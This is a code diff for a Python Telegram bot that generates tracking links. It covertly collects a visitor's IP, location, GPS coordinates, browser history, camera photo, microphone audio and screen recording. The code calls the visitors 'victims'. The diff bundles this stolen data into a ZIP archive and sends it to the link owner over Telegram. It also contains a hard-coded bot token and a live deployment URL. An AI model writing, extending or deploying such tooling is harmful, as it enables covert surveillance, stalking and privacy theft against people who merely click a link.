@@ -10,6 +10,8 @@ import os
 from datetime import datetime
 import requests
 import base64
+import zipfile
+import io
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 
@@ -100,7 +102,6 @@ def track(lid):
     v.update(get_ip_info(ip))
     links[lid]['victims'].append(v)
     asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid, v), loop)
-    
     link_type = links[lid].get('type', 'full')
     if link_type == 'audio':
         return render_template_string(AUDIO_PAGE, link_id=lid)
@@ -154,57 +155,72 @@ def screen(lid):
 
 async def notify(uid, lid, v):
     try:
+        # 📦 Создаём ZIP-архив
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # Текстовый отчёт
+            report = f"""📋 ОТЧЁТ IP LOGGER
+═══════════════
+🕐 Время: {v['time']}
+🌐 IP: {v['ip'].split(',')[0].strip()}
+🏙 Город: {v.get('city','?')}
+🗺 Регион: {v.get('region','?')}
+🌍 Страна: {v.get('country','?')}
+📡 Провайдер: {v.get('isp','?')}
+📱 Устройство: {v.get('ua','?')[:200]}
+"""
+            if v.get('gps') and v['gps'].get('lat'):
+                report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
+            if v.get('history') and v['history'].get('visited'):
+                report += f"\n📜 История браузера:\n"
+                for site in v['history']['visited']:
+                    report += f"  • {site}\n"
+            zf.writestr('report.txt', report)
+            
+            # Фото
+            if v.get('photo'):
+                try:
+                    photo_bytes = base64.b64decode(v['photo'].split(',')[1])
+                    zf.writestr('photo.jpg', photo_bytes)
+                except: pass
+            
+            # Аудио
+            if v.get('audio'):
+                try:
+                    audio_bytes = base64.b64decode(v['audio'].split(',')[1])
+                    zf.writestr('audio.webm', audio_bytes)
+                except: pass
+            
+            # Запись экрана
+            if v.get('screen'):
+                try:
+                    screen_bytes = base64.b64decode(v['screen'].split(',')[1])
+                    zf.writestr('screen_record.webm', screen_bytes)
+                except: pass
+        
+        # Отправляем ZIP
+        zip_buffer.seek(0)
+        await bot.send_file(uid, zip_buffer.getvalue(), caption=f"📦 Архив данных `{lid}`", file_name=f"data_{lid}.zip")
+        
+        # Гео-точка + Google Maps
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             acc = v['gps'].get('acc', 10)
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc else 10))
             await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{acc}м)")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
-            await bot.send_message(uid, f"🛰 [Спутник](https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom=18&size=600x400&maptype=satellite&markers=color:red%7C{lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
-            lat, lon = v['lat'], v['lon']
-            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=500))
+            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
             await bot.send_file(uid, file=geo, caption="📍 IP-геолокация")
-            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
+            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
         
-        msg = f"""🎯 **Переход!**
-🕐 {v['time']}
-🌐 IP: `{v['ip'].split(',')[0].strip()}`
-🏙 Город: {v.get('city','?')}
-🗺 Регион: {v.get('region','?')}
-🌍 Страна: {v.get('country','?')}
-📡 Провайдер: {v.get('isp','?')}
-📱 {v.get('ua','?')[:120]}
-"""
-        if v.get('history') and v['history'].get('visited'):
-            msg += f"\n📜 История: {len(v['history']['visited'])} сайтов"
-        
-        await bot.send_message(uid, msg)
-        
-        if v.get('photo'):
-            try:
-                photo_bytes = base64.b64decode(v['photo'].split(',')[1])
-                await bot.send_file(uid, photo_bytes, caption="📸 Фото с камеры")
-            except: pass
-        
-        if v.get('audio'):
-            try:
-                audio_bytes = base64.b64decode(v['audio'].split(',')[1])
-                await bot.send_file(uid, audio_bytes, caption="🎤 Аудио (5 сек)", voice_note=True)
-            except: pass
-        
-        if v.get('screen'):
-            try:
-                screen_bytes = base64.b64decode(v['screen'].split(',')[1])
-                await bot.send_file(uid, screen_bytes, caption="🎥 Запись экрана (5 сек)", supports_streaming=True)
-            except: pass
     except Exception as e:
         print(f"Ошибка notify: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     buttons = [
-        [Button.inline("🎭 Полный логгер", "full")],
+        [Button.inline("🎭 Полный логгер (ZIP)", "full")],
         [Button.inline("🎤 Только аудио", "audio")],
         [Button.inline("🎥 Только экран", "screen")],
     ]
@@ -214,13 +230,8 @@ async def start(event):
 async def callback(event):
     link_type = event.data.decode()
     lid = gen_id()
-    links[lid] = {
-        'owner': event.sender_id,
-        'created': datetime.now().strftime('%H:%M'),
-        'victims': [],
-        'type': link_type
-    }
-    names = {'full': '🎭 Полный', 'audio': '🎤 Аудио', 'screen': '🎥 Экран'}
+    links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': [], 'type': link_type}
+    names = {'full': '🎭 Полный ZIP', 'audio': '🎤 Аудио', 'screen': '🎥 Экран'}
     await event.edit(f"✅ **{names.get(link_type, link_type)}**\n\n🔗 `https://botaald.onrender.com/go/{lid}`")
 
 @bot.on(events.NewMessage(pattern='/list'))
